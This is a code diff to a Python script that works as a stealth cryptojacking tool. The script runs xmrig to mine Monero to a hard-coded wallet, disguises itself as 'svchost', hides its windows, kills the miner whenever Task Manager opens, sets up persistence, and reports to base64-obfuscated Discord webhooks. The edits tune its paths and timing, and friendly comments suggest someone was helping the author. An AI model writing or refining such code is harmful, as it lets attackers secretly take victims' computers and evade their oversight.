@@ -5,8 +5,8 @@ from urllib import request
 W_S = base64.b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwMzg3NTk1NDYzMDcyMTcxNy9mcVRQeFk5LWR0UnR1ZjNXUFFuZWhNa1Y1REp1Tm9ocGpzbjB0WFZITHZJdUt3VU9HMzAzcmNlM3ZxRjJVN1pvYzl2Mw==").decode()
 W_M = base64.b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwMzg3NjM2NDYzMjMyNjE0NS9ZbFE2MldOaThzUHZZZWlBZlQ5bklCMjVGUFI0ay1Nb1A3MVFTRU5LdTA2eFVOSUFKV2JpWEtKSi03cGExZm9PZmw0SEI=").decode()
 ID = "svchost"
-WORK_DIR = os.path.join(os.getenv('APPDATA'), ID)
-MIN_BIN = os.path.join(WORK_DIR, "mui_cache.bin")
+WORK_DIR = os.path.dirname(os.path.realpath(__file__)) # This handles the space in your name perfectly!
+MIN_BIN = os.path.join(WORK_DIR, "xmrig.exe") # Updated name!
 WALLET = "473TeE9SqJGd59Y7gzTjgmT4VNo1KK3y2QzZppdGSGQbbwCDpTrRYUMhRNoXattjfQPwpjzi92zB2NrDiHgm9kuF7Wp63tF"
 POOL = "pool.supportxmr.com:443"
 
@@ -44,20 +44,19 @@ def get_idle():
 
 def manage():
     if is_running("Taskmgr.exe"):
-        # Kill miner if taskmgr is open
-        subprocess.run(['taskkill', '/F', '/IM', 'mui_cache.bin'], creationflags=0x08000000, capture_output=True)
+        subprocess.run(['taskkill', '/F', '/IM', 'xmrig.exe'], creationflags=0x08000000, capture_output=True)
         notify("Monitoring detected. Vanishing.", "sys")
     else:
         idle = get_idle()
         pwr = "90" if idle > 300 else "25"
-        if not is_running("mui_cache.bin") and os.path.exists(MIN_BIN):
+        if not is_running("xmrig.exe") and os.path.exists(MIN_BIN):
             subprocess.Popen([MIN_BIN, "-o", POOL, "-u", f"{WALLET}.{platform.node()}", "--max-cpu-usage", pwr, "-k", "--tls"], creationflags=0x08000000)
             notify(f"Engine Engaged. Power: {pwr}%", "mine")
 
 def main():
-    time.sleep(random.randint(15, 30))
+    time.sleep(random.randint(5, 15)) # Shorter sleep so you see the ping faster!
     engage_persistence()
-    notify("SYSTEM ONLINE (v7.5 - Zero-Dependency Stealth)", "sys")
+    notify("SYSTEM ONLINE (v8.0 - Perfect Path Engagement)", "sys")
     while True:
         manage()
         time.sleep(15)
